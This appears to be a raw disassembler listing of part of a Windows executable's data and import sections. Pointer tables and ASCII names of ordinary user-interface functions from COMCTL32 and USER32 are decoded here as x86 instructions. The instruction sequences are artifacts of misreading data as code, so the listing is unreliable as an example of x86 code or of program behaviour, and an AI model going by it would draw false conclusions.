  4281f4:	add    BYTE PTR [edx+0x0],0x37
  4281f8:	add    BYTE PTR [edx+0x0],0x3b
  4281fc:	add    BYTE PTR [edx+0x0],0x3f
  428200:	add    BYTE PTR [edx+0x0],0x43
  428204:	add    BYTE PTR [edx+0x0],0x47
  428208:	add    BYTE PTR [edx+0x0],0x4b
  42820c:	add    BYTE PTR [edx+0x0],0x4f
  428210:	add    BYTE PTR [edx+0x0],0x53
  428214:	add    BYTE PTR [edx+0x0],0x57
  428218:	add    BYTE PTR [edx+0x0],0x5b
  42821c:	add    BYTE PTR [edx+0x0],0x5f
  428220:	add    BYTE PTR [edx+0x0],0x63
  428224:	add    BYTE PTR [edx+0x0],0x67
  428228:	add    BYTE PTR [edx+0x0],0x29
  42822c:	or     al,0x10
  42822e:	add    BYTE PTR [edx-0x57ffefc2],dl
  428234:	push   edi
  428235:	adc    BYTE PTR [eax],al
  428237:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428238:	outs   dx,DWORD PTR ds:[esi]
  428239:	adc    BYTE PTR [eax],al
  42823b:	push   ebx
  42823c:	popa   
  42823d:	adc    BYTE PTR [eax],al
  42823f:	add    dh,BYTE PTR [ebp+0x10]
  428242:	add    dh,cl
  428244:	jle    0x428256
  428246:	add    BYTE PTR [esi+edx*2],dl
  428249:	adc    BYTE PTR [eax],al
  42824b:	mov    al,0x68
  42824d:	adc    BYTE PTR [eax],al
  42824f:	aas    
  428250:	inc    esp
  428251:	adc    BYTE PTR [eax],al
  428253:	pop    ebp
  428254:	and    DWORD PTR [eax],edx
  428256:	add    bl,dl
  428258:	jl     0x42826a
  42825a:	add    BYTE PTR [edx+0xb],dh
  42825d:	adc    BYTE PTR [eax],al
  42825f:	inc    edx
  428260:	push   eax
  428261:	adc    BYTE PTR [eax],al
  428263:	mov    ebp,0xbb001074
  428268:	pop    ds
  428269:	adc    BYTE PTR [eax],al
  42826b:	sub    DWORD PTR [eax+0x10],eax
  42826e:	add    BYTE PTR [ecx],dh
  428270:	ja     0x428282
  428272:	add    bl,dl
  428274:	sbb    dl,BYTE PTR [eax]
  428276:	add    BYTE PTR [esi+0x1e],ch
  428279:	adc    BYTE PTR [eax],al
  42827b:	or     ch,BYTE PTR [esi]
  42827d:	adc    BYTE PTR [eax],al
  42827f:	sbb    eax,0xa100103e
  428284:	data16 adc BYTE PTR [eax],al
  428287:	xchg   ecx,eax
  428288:	bound  edx,QWORD PTR [eax]
  42828a:	add    BYTE PTR [esi],bh
  42828c:	dec    edi
  42828d:	adc    BYTE PTR [eax],al
  42828f:	in     eax,dx
  428290:	adc    BYTE PTR fs:[eax],al
  428293:	sub    bl,BYTE PTR [ecx+0x10]
  428296:	add    BYTE PTR [esi+0x43],al
  428299:	adc    BYTE PTR [eax],al
  42829b:	imul   edi,DWORD PTR [eax+edx*1],0x0
  42829f:	rol    BYTE PTR [esi+0x10],0x0
  4282a3:	in     eax,0x31
  4282a5:	adc    BYTE PTR [eax],al
  4282a7:	mov    esp,0x6b00104f
  4282ac:	add    BYTE PTR [edx+0x0],0x6f
  4282b0:	add    BYTE PTR [edx+0x0],0x73
  4282b4:	add    BYTE PTR [edx+0x0],0x77
  4282b8:	add    BYTE PTR [edx+0x0],0x7b
  4282bc:	add    BYTE PTR [edx+0x0],0x7f
  4282c0:	add    BYTE PTR [edx+0x0],0x83
  4282c4:	add    BYTE PTR [edx+0x0],0x87
  4282c8:	add    BYTE PTR [edx+0x0],0x8b
  4282cc:	add    BYTE PTR [edx+0x0],0x8f
  4282d0:	add    BYTE PTR [edx+0x0],0x93
  4282d4:	add    BYTE PTR [edx+0x0],0x97
  4282d8:	add    BYTE PTR [edx+0x0],0x9b
  4282dc:	add    BYTE PTR [edx+0x0],0x9f
  4282e0:	add    BYTE PTR [edx+0x0],0xa3
  4282e4:	add    BYTE PTR [edx+0x0],0xa7
  4282e8:	add    BYTE PTR [edx+0x0],0xe1
  4282ec:	and    dl,BYTE PTR [eax]
  4282ee:	add    bh,bh
  4282f0:	push   ecx
  4282f1:	adc    BYTE PTR [eax],al
  4282f3:	test   BYTE PTR ds:0x1d0c0010,0x10
  4282fa:	add    BYTE PTR [ebx],al
  4282fc:	sbb    dl,BYTE PTR [eax]
  4282fe:	add    ch,ah
  428300:	or     dl,BYTE PTR [eax]
  428302:	add    BYTE PTR [edi+0x42001035],bl
  428308:	pop    edi
  428309:	adc    BYTE PTR [eax],al
  42830b:	adc    eax,0xd300103f
  428310:	cmp    dl,BYTE PTR [eax]
  428312:	add    BYTE PTR [ebp+0x1001021],ah
  428318:	sbb    al,0x10
  42831a:	add    BYTE PTR [ebx-0x1effefd7],ch
  428320:	adc    BYTE PTR cs:[eax],al
  428323:	push   eax
  428324:	adc    BYTE PTR [bx+si],al
  428327:	mov    edi,0xeb00102d
  42832c:	add    BYTE PTR [edx+0x0],0xef
  428330:	add    BYTE PTR [edx+0x0],0xf3
  428334:	add    BYTE PTR [edx+0x0],0xf7
  428338:	add    BYTE PTR [edx+0x0],0xfb
  42833c:	add    BYTE PTR [edx+0x0],0xff
  428340:	add    BYTE PTR [edx+0x0],0x3
  428344:	add    DWORD PTR [edx+0x0],0x7
  428348:	add    DWORD PTR [edx+0x0],0xb
  42834c:	add    DWORD PTR [edx+0x0],0xf
  428350:	add    DWORD PTR [edx+0x0],0x13
  428354:	add    DWORD PTR [edx+0x0],0x17
  428358:	add    DWORD PTR [edx+0x0],0x1b
  42835c:	add    DWORD PTR [edx+0x0],0x1f
  428360:	add    DWORD PTR [edx+0x0],0x23
  428364:	add    DWORD PTR [edx+0x0],0x27
  428368:	add    DWORD PTR [edx+0x0],0xffffff98
  42836c:	pusha  
  42836d:	adc    BYTE PTR [eax],al
  42836f:	pop    ebp
  428370:	js     0x428382
  428372:	add    BYTE PTR [esi],bh
  428374:	dec    eax
  428375:	adc    BYTE PTR [eax],al
  428377:	cmp    al,0x7a
  428379:	adc    BYTE PTR [eax],al
  42837b:	aam    0x9
  42837d:	adc    BYTE PTR [eax],al
  42837f:	or     cl,BYTE PTR [ebx]
  428381:	adc    BYTE PTR [eax],al
  428383:	pop    ebx
  428384:	push   ebp
  428385:	adc    BYTE PTR [eax],al
  428387:	mov    esi,0x6001032
  42838c:	xor    edx,DWORD PTR [eax]
  42838e:	add    BYTE PTR [esi-0x16ffefc0],al
  428394:	and    eax,0x61460010
  428399:	adc    BYTE PTR [eax],al
  42839b:	adc    DWORD PTR [ebp+0x10],ebp
  42839e:	add    al,al
  4283a0:	dec    esi
  4283a1:	adc    BYTE PTR [eax],al
  4283a3:	jae    0x4283c3
  4283a5:	adc    BYTE PTR [eax],al
  4283a7:	dec    ebx
  4283a8:	add    eax,0x836b0010
  4283ad:	inc    edx
  4283ae:	add    BYTE PTR [edi-0x7d],ch
  4283b1:	inc    edx
  4283b2:	add    BYTE PTR [ebx-0x7d],dh
  4283b5:	inc    edx
  4283b6:	add    BYTE PTR [edi-0x7d],dh
  4283b9:	inc    edx
  4283ba:	add    BYTE PTR [ebx-0x7d],bh
  4283bd:	inc    edx
  4283be:	add    BYTE PTR [edi-0x7d],bh
  4283c1:	inc    edx
  4283c2:	add    BYTE PTR [ebx-0x78ffbd7d],al
  4283c8:	add    DWORD PTR [edx+0x0],0xffffff8b
  4283cc:	add    DWORD PTR [edx+0x0],0xffffff8f
  4283d0:	add    DWORD PTR [edx+0x0],0xffffff93
  4283d4:	add    DWORD PTR [edx+0x0],0xffffff97
  4283d8:	add    DWORD PTR [edx+0x0],0xffffff9b
  4283dc:	add    DWORD PTR [edx+0x0],0xffffff9f
  4283e0:	add    DWORD PTR [edx+0x0],0xffffffa3
  4283e4:	add    DWORD PTR [edx+0x0],0xffffffa7
  4283e8:	add    DWORD PTR [edx+0x0],0x0
	...
  4283f4:	cmp    dh,BYTE PTR [ecx+0x52]
  4283f7:	dec    edi
  4283f8:	add    BYTE PTR [eax],al
  4283fa:	add    BYTE PTR [eax],al
  4283fc:	push   eax
  4283fd:	lea    eax,[edx]
  4283ff:	add    BYTE PTR [ecx],al
  428401:	add    BYTE PTR [eax],al
  428403:	add    BYTE PTR [ecx],al
  428405:	add    BYTE PTR [eax],al
  428407:	add    BYTE PTR [ecx],al
  428409:	add    BYTE PTR [eax],al
  42840b:	add    BYTE PTR [eax],ah
  42840d:	lea    eax,[edx]
  42840f:	add    BYTE PTR [eax-0x73],al
  428412:	add    al,BYTE PTR [eax]
  428414:	xor    BYTE PTR [ebp+0x2],cl
	...
  428422:	add    BYTE PTR [eax],al
  428424:	call   0x44286ae
  428429:	xchg   BYTE PTR [edx],al
  42842b:	add    BYTE PTR [esi],dl
  42842d:	xchg   BYTE PTR [edx],al
  42842f:	add    BYTE PTR [eax],ch
  428431:	xchg   BYTE PTR [edx],al
  428433:	add    BYTE PTR [eax-0x7a],al
  428436:	add    al,BYTE PTR [eax]
  428438:	push   esp
  428439:	xchg   BYTE PTR [edx],al
  42843b:	add    BYTE PTR [esi-0x7a],ch
  42843e:	add    al,BYTE PTR [eax]
  428440:	add    BYTE PTR [eax],al
  428442:	add    BYTE PTR [eax],al
  428444:	nop
  428445:	xchg   BYTE PTR [edx],al
  428447:	add    BYTE PTR [esi-0x43fffd7a],ch
  42844d:	xchg   BYTE PTR [edx],al
  42844f:	add    dl,cl
  428451:	xchg   BYTE PTR [edx],al
  428453:	add    dh,bl
  428455:	xchg   BYTE PTR [edx],al
  428457:	add    ah,ch
  428459:	xchg   BYTE PTR [edx],al
  42845b:	add    dh,bh
  42845d:	xchg   BYTE PTR [edx],al
  42845f:	add    BYTE PTR [eax],dl
  428461:	xchg   DWORD PTR [edx],eax
  428463:	add    BYTE PTR [esi],bl
  428465:	xchg   DWORD PTR [edx],eax
  428467:	add    BYTE PTR [eax],dh
  428469:	xchg   DWORD PTR [edx],eax
  42846b:	add    BYTE PTR [edx-0x79],al
  42846e:	add    al,BYTE PTR [eax]
  428470:	push   eax
  428471:	xchg   DWORD PTR [edx],eax
  428473:	add    BYTE PTR [esi-0x79],bl
  428476:	add    al,BYTE PTR [eax]
  428478:	jo     0x428401
  42847a:	add    al,BYTE PTR [eax]
  42847c:	jl     0x428405
  42847e:	add    al,BYTE PTR [eax]
  428480:	xchg   edx,eax
  428481:	xchg   DWORD PTR [edx],eax
  428483:	add    BYTE PTR [edi+eax*4-0x7849fffe],ah
  42848a:	add    al,BYTE PTR [eax]
  42848c:	ret    0x287
  42848f:	add    dl,dl
  428491:	xchg   DWORD PTR [edx],eax
  428493:	add    dl,ah
  428495:	xchg   DWORD PTR [edx],eax
  428497:	add    al,bh
  428499:	xchg   DWORD PTR [edx],eax
  42849b:	add    BYTE PTR [eax+ecx*4],al
  42849e:	add    al,BYTE PTR [eax]
  4284a0:	push   ss
  4284a1:	mov    BYTE PTR [edx],al
  4284a3:	add    BYTE PTR [eax+ecx*4],ch
  4284a6:	add    al,BYTE PTR [eax]
  4284a8:	mov    BYTE PTR ds:[edx],al
  4284ab:	add    BYTE PTR [eax+ecx*4+0x2],cl
  4284af:	add    BYTE PTR [eax+ecx*4+0x2],bl
  4284b3:	add    BYTE PTR [esi-0x78],ch
  4284b6:	add    al,BYTE PTR [eax]
  4284b8:	or     BYTE PTR [eax-0x7767fffe],0x2
  4284bf:	add    BYTE PTR [edx-0x43fffd78],ch
  4284c5:	mov    BYTE PTR [edx],al
  4284c7:	add    ah,cl
  4284c9:	mov    BYTE PTR [edx],al
  4284cb:	add    ah,bl
  4284cd:	mov    BYTE PTR [edx],al
  4284cf:	add    ah,ch
  4284d1:	mov    BYTE PTR [edx],al
  4284d3:	add    dh,bh
  4284d5:	mov    BYTE PTR [edx],al
  4284d7:	add    BYTE PTR [ecx+ecx*4],cl
  4284da:	add    al,BYTE PTR [eax]
  4284dc:	sbb    cl,BYTE PTR [ecx-0x76cdfffe]
  4284e2:	add    al,BYTE PTR [eax]
  4284e4:	inc    esp
  4284e5:	mov    DWORD PTR [edx],eax
  4284e7:	add    BYTE PTR [esi-0x77],dl
  4284ea:	add    al,BYTE PTR [eax]
  4284ec:	bound  ecx,QWORD PTR [ecx-0x7691fffe]
  4284f2:	add    al,BYTE PTR [eax]
  4284f4:	jp     0x42847f
  4284f6:	add    al,BYTE PTR [eax]
  4284f8:	mov    cl,BYTE PTR [ecx-0x765ffffe]
  4284fe:	add    al,BYTE PTR [eax]
  428500:	scas   al,BYTE PTR es:[edi]
  428501:	mov    DWORD PTR [edx],eax
  428503:	add    al,al
  428505:	mov    DWORD PTR [edx],eax
  428507:	add    dl,dl
  428509:	mov    DWORD PTR [edx],eax
  42850b:	add    BYTE PTR [eax],al
  42850d:	add    BYTE PTR [eax],al
  42850f:	add    ah,ch
  428511:	mov    DWORD PTR [edx],eax
  428513:	add    BYTE PTR [eax],al
  428515:	add    BYTE PTR [eax],al
  428517:	add    BYTE PTR [edx],cl
  428519:	mov    al,BYTE PTR [edx]
  42851b:	add    BYTE PTR [edx+ecx*4],bl
  42851e:	add    al,BYTE PTR [eax]
  428520:	mov    al,BYTE PTR cs:[edx]
  428523:	add    BYTE PTR [edx+ecx*4+0x2],al
  428527:	add    BYTE PTR [esi-0x76],dl
  42852a:	add    al,BYTE PTR [eax]
  42852c:	push   0x7800028a
  428531:	mov    al,BYTE PTR [edx]
  428533:	add    BYTE PTR [esi-0x59fffd76],dl
  428539:	mov    al,BYTE PTR [edx]
  42853b:	add    BYTE PTR [edx+ecx*4-0x753bfffe],dh
  428542:	add    al,BYTE PTR [eax]
  428544:	ror    BYTE PTR [edx-0x751dfffe],cl
  42854a:	add    al,BYTE PTR [eax]
  42854c:	out    dx,al
  42854d:	mov    al,BYTE PTR [edx]
  42854f:	add    BYTE PTR [eax],al
  428551:	mov    eax,DWORD PTR [edx]
  428553:	add    BYTE PTR [edx],dl
  428555:	mov    eax,DWORD PTR [edx]
  428557:	add    BYTE PTR [eax],ch
  428559:	mov    eax,DWORD PTR [edx]
  42855b:	add    BYTE PTR [esi],dh
  42855d:	mov    eax,DWORD PTR [edx]
  42855f:	add    BYTE PTR [edx-0x75],al
  428562:	add    al,BYTE PTR [eax]
  428564:	pop    esp
  428565:	mov    eax,DWORD PTR [edx]
  428567:	add    BYTE PTR [ebx+ecx*4+0x2],dh
  42856b:	add    BYTE PTR [ebx+ecx*4-0x7465fffe],cl
  428572:	add    al,BYTE PTR [eax]
  428574:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428575:	mov    eax,DWORD PTR [edx]
  428577:	add    BYTE PTR [eax+0x28b],bh
  42857d:	add    BYTE PTR [eax],al
  42857f:	add    al,bl
  428581:	mov    eax,DWORD PTR [edx]
  428583:	add    dl,ah
  428585:	mov    eax,DWORD PTR [edx]
  428587:	add    al,dh
  428589:	mov    eax,DWORD PTR [edx]
  42858b:	add    ah,bh
  42858d:	mov    eax,DWORD PTR [edx]
  42858f:	add    BYTE PTR [esp+ecx*4],cl
  428592:	add    al,BYTE PTR [eax]
  428594:	sbb    cl,BYTE PTR [edx+eax*1+0x28c2600]
  42859b:	add    BYTE PTR [eax],dh
  42859d:	mov    WORD PTR [edx],es
  42859f:	add    BYTE PTR [edx-0x74],al
  4285a2:	add    al,BYTE PTR [eax]
  4285a4:	pop    eax
  4285a5:	mov    WORD PTR [edx],es
  4285a7:	add    BYTE PTR [esi-0x74],ch
  4285aa:	add    al,BYTE PTR [eax]
  4285ac:	test   BYTE PTR [edx+eax*1+0x28c9400],cl
  4285b3:	add    BYTE PTR [esp+ecx*4-0x734bfffe],ah
  4285ba:	add    al,BYTE PTR [eax]
  4285bc:	ret    0x28c
  4285bf:	add    dl,bl
  4285c1:	mov    WORD PTR [edx],es
  4285c3:	add    ah,ah
  4285c5:	mov    WORD PTR [edx],es
  4285c7:	add    al,dh
  4285c9:	mov    WORD PTR [edx],es
  4285cb:	add    dh,bh
  4285cd:	mov    WORD PTR [edx],es
	...
  4285df:	add    BYTE PTR [ebx+0x6d],ah
  4285e2:	fs cs gs js 0x42864c
  4285e7:	add    BYTE PTR [edi],dl
  4285e9:	add    BYTE PTR [ebp+eiz*2+0x73],al
  4285ed:	je     0x428661
  4285ef:	outs   dx,DWORD PTR ds:[esi]
  4285f0:	jns    0x428642
  4285f2:	jb     0x428663
  4285f4:	jo     0x42865b
  4285f6:	jb     0x42866c
  4285f8:	jns    0x42864d
  4285fa:	push   0x50746565
  4285ff:	popa   
  428600:	add    BYTE PTR gs:[bx+si],al
  428604:	pop    esp
  428605:	add    BYTE PTR [eax+0x72],dl
  428608:	outs   dx,DWORD PTR ds:[esi]
  428609:	jo     0x428670
  42860b:	jb     0x428681
  42860d:	jns    0x428662
  42860f:	push   0x57746565
  428614:	add    BYTE PTR [eax],al
  428616:	pop    ebx
  428617:	add    BYTE PTR [eax+0x72],dl
  42861a:	outs   dx,DWORD PTR ds:[esi]
  42861b:	jo     0x428682
  42861d:	jb     0x428693
  42861f:	jns    0x428674
  428621:	push   0x41746565
  428626:	add    BYTE PTR [eax],al
  428628:	dec    esi
  428629:	add    BYTE PTR [ecx+0x6d],cl
  42862c:	popa   
  42862d:	addr16 gs dec esp
  428630:	imul   esi,DWORD PTR [ebx+0x74],0x7065525f
  428637:	ins    BYTE PTR es:[edi],dx
  428638:	popa   
  428639:	arpl   WORD PTR [ebp+0x49],sp
  42863c:	arpl   WORD PTR [edi+0x6e],bp
  42863f:	add    BYTE PTR [ecx],dh
  428641:	add    BYTE PTR [ecx+0x6d],cl
  428644:	popa   
  428645:	addr16 gs dec esp
  428648:	imul   esi,DWORD PTR [ebx+0x74],0x7365445f
  42864f:	je     0x4286c3
  428651:	outs   dx,DWORD PTR ds:[esi]
  428652:	jns    0x428654
  428654:	inc    eax
  428655:	add    BYTE PTR [ecx+0x6d],cl
  428658:	popa   
  428659:	addr16 gs dec esp
  42865c:	imul   esi,DWORD PTR [ebx+0x74],0x7465475f
  428663:	dec    ecx
  428664:	ins    DWORD PTR es:[edi],dx
  428665:	popa   
  428666:	addr16 gs inc ebx
  428669:	outs   dx,DWORD PTR ds:[esi]
  42866a:	jne    0x4286da
  42866c:	je     0x42866e
  42866e:	dec    esp
  42866f:	add    BYTE PTR [ecx+0x6d],cl
  428672:	popa   
  428673:	addr16 gs dec esp
  428676:	imul   esi,DWORD PTR [ebx+0x74],0x6d65525f
  42867d:	outs   dx,DWORD PTR ds:[esi]
  42867e:	jbe    0x4286e5
  428680:	add    BYTE PTR [eax],al
  428682:	inc    ebx
  428683:	dec    edi
  428684:	dec    ebp
  428685:	inc    ebx
  428686:	push   esp
  428687:	dec    esp
  428688:	xor    esi,DWORD PTR [edx]
  42868a:	cs fs ins BYTE PTR es:[edi],dx
  42868d:	ins    BYTE PTR es:[edi],dx
  42868e:	add    BYTE PTR [eax],al
  428690:	push   edi
  428691:	add    BYTE PTR [ebx+0x72],al
  428694:	gs popa 
  428696:	je     0x4286fd
  428698:	inc    esp
  428699:	imul   esp,DWORD PTR [ecx+0x6c],0x6e49676f
  4286a0:	imul   esi,DWORD PTR fs:[edx+0x65],0x61507463
  4286a8:	jb     0x42870b
  4286aa:	ins    DWORD PTR es:[edi],dx
  4286ab:	push   edi
  4286ac:	add    BYTE PTR [eax],al
  4286ae:	xor    al,BYTE PTR [edx]
  4286b0:	push   ebx
  4286b1:	gs je  0x4286f7
  4286b4:	popa   
  4286b5:	jb     0x42871c
  4286b7:	je     0x428709
  4286b9:	outs   dx,DWORD PTR ds:[esi]
  4286ba:	jae    0x4286bc
  4286bc:	cmp    al,BYTE PTR [ecx]
  4286be:	inc    edi
  4286bf:	gs je  0x42870f
  4286c2:	gs jae 0x428738
  4286c5:	popa   
  4286c6:	addr16 gs inc ecx
  4286c9:	add    BYTE PTR [edx+0x61724400],dh
  4286cf:	ja     0x428717
  4286d1:	jb     0x428734
  4286d3:	ins    DWORD PTR es:[edi],dx
  4286d4:	gs inc ebx
  4286d6:	outs   dx,DWORD PTR ds:[esi]
  4286d7:	outs   dx,BYTE PTR ds:[esi]
  4286d8:	je     0x42874c
  4286da:	outs   dx,DWORD PTR ds:[esi]
  4286db:	ins    BYTE PTR es:[edi],dx
  4286dc:	add    BYTE PTR [eax],al
  4286de:	sbb    BYTE PTR [ecx],al
  4286e0:	inc    edi
  4286e1:	gs je  0x42872d
  4286e4:	arpl   WORD PTR [edi+0x6e],bp
  4286e7:	dec    ecx
  4286e8:	outs   dx,BYTE PTR ds:[esi]
  4286e9:	outs   dx,WORD PTR ds:[esi]
  4286eb:	add    bl,bh
  4286ed:	add    dl,BYTE PTR [edx+esi*2+0x61]
  4286f1:	arpl   WORD PTR [ebx+0x50],bp
  4286f4:	outs   dx,DWORD PTR ds:[esi]
  4286f5:	jo     0x42876c
  4286f7:	jo     0x428746
  4286f9:	outs   dx,BYTE PTR gs:[esi]
  4286fb:	jne    0x4286fd
  4286fd:	add    cl,bl
  4286ff:	add    DWORD PTR [ebp+0x6f],ecx
  428702:	outs   dx,BYTE PTR ds:[esi]
  428703:	imul   esi,DWORD PTR [edi+ebp*2+0x72],0x6d6f7246
  42870b:	push   edx
  42870c:	arpl   WORD PTR gs:[eax+eax*1+0x39],si
  428711:	add    BYTE PTR [ebx+0x68],al
  428714:	popa   
  428715:	jb     0x42876c
  428717:	jo     0x428789
  428719:	gs jb  0x428773
  42871c:	add    BYTE PTR [eax],al
  42871e:	add    dl,BYTE PTR ds:[ebx+0x65]
  428722:	je     0x428768
  428724:	ins    BYTE PTR es:[edi],dx
  428725:	addr16 dec ecx
  428727:	je     0x42878e
  428729:	ins    DWORD PTR es:[edi],dx
  42872a:	push   esp
  42872b:	gs js  0x4287a2
  42872e:	inc    ecx
  42872f:	add    BYTE PTR [edx+eax*1+0x53],bh
  428733:	push   0x774f776f
  428738:	outs   dx,BYTE PTR ds:[esi]
  428739:	gs fs push eax
  42873c:	outs   dx,DWORD PTR ds:[esi]
  42873d:	jo     0x4287b4
  42873f:	jo     0x4287b4
  428741:	add    BYTE PTR [eax],bl
  428743:	add    dl,BYTE PTR [edx+0x65]
  428746:	ins    DWORD PTR es:[edi],dx
  428747:	outs   dx,DWORD PTR ds:[esi]
  428748:	jbe    0x4287af
  42874a:	push   eax
  42874b:	jb     0x4287bc
  42874d:	jo     0x4287a6
  42874f:	add    BYTE PTR [edi+0x2],bh
  428752:	push   ebx
  428753:	push   0x6957776f
  428758:	outs   dx,BYTE PTR ds:[esi]
  428759:	outs   dx,DWORD PTR fs:[esi]
  42875b:	ja     0x42875d
  42875d:	add    BYTE PTR [ebx],bl
  42875f:	add    BYTE PTR [ebx+0x61],al
  428762:	ins    BYTE PTR es:[edi],dx
  428763:	ins    BYTE PTR es:[edi],dx
  428764:	push   edi
  428765:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  42876c:	outs   dx,DWORD PTR ds:[esi]
  42876d:	arpl   WORD PTR [edi+0x0],dx
  428770:	mov    dh,0x1
  428772:	dec    esp
  428773:	outs   dx,DWORD PTR ds:[esi]
  428774:	popa   
  428775:	fs dec ebp
  428777:	outs   dx,BYTE PTR gs:[esi]
  428779:	jne    0x4287bc
  42877b:	add    BYTE PTR [edx+eax*1+0x74697753],al
  428782:	arpl   WORD PTR [eax+0x54],bp
  428785:	outs   dx,DWORD PTR ds:[esi]
  428786:	push   esp
  428787:	push   0x69577369
  42878c:	outs   dx,BYTE PTR ds:[esi]
  42878d:	outs   dx,DWORD PTR fs:[esi]
  42878f:	ja     0x428791
  428791:	add    BYTE PTR [eax],ah
  428793:	add    dl,BYTE PTR [ebx+0x63]
  428796:	jb     0x428807
  428798:	ins    BYTE PTR es:[edi],dx
  428799:	ins    BYTE PTR es:[edi],dx
  42879a:	push   edi
  42879b:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  4287a2:	add    BYTE PTR [eax],al
  4287a4:	pop    DWORD PTR [eax]
  4287a6:	inc    esp
  4287a7:	gs push di
  4287aa:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  4287b1:	outs   dx,DWORD PTR ds:[esi]
  4287b2:	arpl   WORD PTR [edi+0x0],dx
  4287b5:	add    BYTE PTR [ecx],dh
  4287b7:	add    BYTE PTR [ebx+0x68],al
  4287ba:	popa   
  4287bb:	jb     0x42880d
  4287bd:	jb     0x428824
  4287bf:	jbe    0x428818
  4287c1:	add    BYTE PTR [edx+eax*1+0x696c6156],ch
  4287c8:	fs popa 
  4287ca:	je     0x428831
  4287cc:	push   edx
  4287cd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  4287d2:	xor    eax,DWORD PTR [ecx]
  4287d4:	inc    edi
  4287d5:	gs je  0x428825
  4287d8:	outs   dx,BYTE PTR gs:[esi]
  4287da:	jne    0x428825
  4287dc:	je     0x428843
  4287de:	ins    DWORD PTR es:[edi],dx
  4287df:	dec    ecx
  4287e0:	inc    esp
  4287e1:	add    BYTE PTR ds:0x6e655302,ch
  4287e7:	fs dec esi
  4287e9:	outs   dx,DWORD PTR ds:[esi]
  4287ea:	je     0x428855
  4287ec:	data16 jns 0x42883c
  4287ef:	gs jae 0x428865
  4287f2:	popa   
  4287f3:	addr16 gs push edi
  4287f6:	add    BYTE PTR [eax],al
  4287f8:	mov    al,0x1
  4287fa:	dec    esp
  4287fb:	outs   dx,DWORD PTR ds:[esi]
  4287fc:	popa   
  4287fd:	fs dec ecx
  4287ff:	arpl   WORD PTR [edi+0x6e],bp
  428802:	push   edi
  428803:	add    BYTE PTR [ecx+0x57734901],ah
  428809:	imul   ebp,DWORD PTR [esi+0x64],0x6e45776f
  428810:	popa   
  428811:	bound  ebp,QWORD PTR [ebp+eiz*2+0x64]
  428815:	add    BYTE PTR ds:0x74654701,dl
  42881b:	inc    esi
  42881c:	outs   dx,DWORD PTR ds:[esi]
  42881d:	jb     0x428884
  42881f:	addr16 jb 0x428891
  428822:	jne    0x428892
  428824:	fs push edi
  428826:	imul   ebp,DWORD PTR [esi+0x64],0x7500776f
  42882d:	add    DWORD PTR [edi+0x65],eax
  428830:	je     0x428889
  428832:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428839:	js     0x4288af
  42883b:	inc    ecx
  42883c:	add    BYTE PTR [eax],al
  42883e:	add    DWORD PTR ds:[edi+0x65],eax
  428842:	je     0x428891
  428844:	gs jae 0x4288ba
  428847:	popa   
  428848:	addr16 gs push edi
  42884b:	add    BYTE PTR [ebx],ch
  42884d:	add    dl,BYTE PTR [ebx+0x65]
  428850:	outs   dx,BYTE PTR ds:[esi]
  428851:	fs dec ebp
  428853:	gs jae 0x4288c9
  428856:	popa   
  428857:	addr16 gs push edi
  42885a:	add    BYTE PTR [eax],al
  42885c:	das    
  42885d:	add    dl,BYTE PTR [ebx+0x65]
  428860:	je     0x4288a3
  428862:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428866:	gs push edi
  428868:	imul   ebp,DWORD PTR [esi+0x64],0x400776f
  42886f:	add    dl,BYTE PTR [edx+0x65]
  428872:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  42887a:	popa   
  42887b:	jae    0x4288f0
  42887d:	inc    ebp
  42887e:	js     0x4288d7
  428880:	add    BYTE PTR [eax],al
  428882:	and    DWORD PTR [edx],eax
  428884:	push   ebx
  428885:	outs   dx,BYTE PTR gs:[esi]
  428887:	fs inc esp
  428889:	ins    BYTE PTR es:[edi],dx
  42888a:	addr16 dec ecx
  42888c:	je     0x4288f3
  42888e:	ins    DWORD PTR es:[edi],dx
  42888f:	dec    ebp
  428890:	gs jae 0x428906
  428893:	popa   
  428894:	addr16 gs inc ecx
  428897:	add    BYTE PTR ds:0x74654701,bh
  42889d:	dec    ebp
  42889e:	gs jae 0x428914
  4288a1:	popa   
  4288a2:	addr16 gs push esp
  4288a5:	imul   ebp,DWORD PTR [ebp+0x65],0x1d0000
  4288ac:	inc    ebx
  4288ad:	popa   
  4288ae:	jae    0x428913
  4288b0:	popa   
  4288b1:	fs gs push edi
  4288b4:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  4288bb:	add    bh,bl
  4288bd:	add    BYTE PTR [ebp+0x78],al
  4288c0:	imul   esi,DWORD PTR [edi+edx*2+0x69],0x776f646e
  4288c8:	jae    0x42890f
  4288ca:	js     0x4288cc
  4288cc:	repnz add DWORD PTR [eax+0x6f],edx
  4288d0:	jae    0x428946
  4288d2:	dec    ebp
  4288d3:	gs jae 0x428949
  4288d6:	popa   
  4288d7:	addr16 gs push edi
  4288da:	add    BYTE PTR [eax],al
  4288dc:	add    DWORD PTR fs:[edi+0x65],eax
  4288e0:	je     0x428937
  4288e2:	jo     0x428948
  4288e4:	popa   
  4288e5:	je     0x42894c
  4288e7:	push   edx
  4288e8:	outs   dx,BYTE PTR ds:[si]
  4288ea:	add    BYTE PTR [eax],al
  4288ec:	mov    BYTE PTR [edx],al
  4288ee:	push   esp
  4288ef:	popa   
  4288f0:	bound  esp,QWORD PTR [edx+0x65]
  4288f3:	fs push esp
  4288f5:	gs js  0x42896c
  4288f8:	dec    edi
  4288f9:	jne    0x42896f
  4288fb:	push   edi
  4288fc:	add    BYTE PTR [eax],al
  4288fe:	test   eax,0x616f4c01
  428903:	fs inc edx
  428905:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xb8004170
  42890d:	add    BYTE PTR [edx+esi*2+0x61],al
  428911:	ja     0x428966
  428913:	je     0x428976
  428915:	je     0x42897c
  428917:	push   edi
  428918:	add    BYTE PTR [eax],al
  42891a:	ja     0x42891d
  42891c:	inc    edi
  42891d:	gs je  0x428977
  428920:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428927:	js     0x42899d
  428929:	dec    esp
  42892a:	outs   dx,BYTE PTR gs:[esi]
  42892c:	addr16 je 0x428997
  42892f:	push   edi
